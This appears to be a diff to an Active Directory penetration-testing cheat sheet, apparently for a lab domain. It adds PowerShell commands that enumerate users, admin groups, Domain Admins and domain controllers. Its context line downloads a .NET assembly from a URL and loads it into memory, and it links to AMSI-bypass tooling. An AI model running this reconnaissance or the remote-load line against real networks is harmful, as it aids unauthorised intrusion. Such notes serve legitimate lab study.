@@ -587,8 +587,22 @@ $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBas
 https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer
 ```
 
+
+# 5.Enumeration
+```
+Get-ADDefaultDomainPasswordPolicy
+Get-ADDomainController
+Get-ADUser -Filter * |   Select-Object Name, SamAccountName
+Get-ADGroup -Filter "Name -like '*Admin*'" | Select-Object Name, GroupScope, Description
+Get-ADGroupMember -Identity "Domain Admins" |   Select-Object Name, SamAccountName
+net user johndoe /domain
+
+Find DCs with DNS Query
+nslookup -type=srv _ldap._tcp.dc._msdcs.sevenkingdoms.local 192.168.56.10
+```
+
+
 ### Refrences
 * [Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
 * [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe)
 * [ADModule](https://github.com/samratashok/ADModule)
-
